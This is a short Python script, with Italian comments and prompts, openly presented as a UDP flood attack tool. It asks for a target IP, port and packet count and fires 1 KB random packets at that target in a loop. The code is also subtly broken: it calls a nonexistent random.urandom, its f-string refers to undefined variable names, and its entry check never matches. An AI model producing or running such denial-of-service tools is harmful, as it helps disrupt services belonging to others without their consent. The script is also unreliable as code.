


import socket
import random

def udp_flood(target_ip, target_port, num_packets):
    # Crea un socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Genera un pacchetto di 1 KB (1024 bytes) con dati casuali
    packet = random.urandom(1024)

    print(f"Inizio dell'attacco UDP flood su {targetip}:{targetport} con {numpackets} pacchetti da 1KB")

    # Invia il numero specificato di pacchetti
    for i in range(num_packets):
        client.sendto(packet, (target_ip, target_port))
        print(f"Pacchetto {i+1}/{num_packets} inviato a {target_ip}:{target_port}")

    print("Attacco UDP flood completato")

if __name__ == "__main":
    # Richiedi all'utente di inserire l'IP target
    target_ip = input("Inserisci l'IP target: ")
    # Richiedi all'utente di inserire la porta target
    target_port = int(input("Inserisci la porta target: "))
    # Richiedi all'utente di inserire il numero di pacchetti da inviare
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    # Esegui l'attacco UDP flood
    udp_flood(target_ip, target_port, num_packets)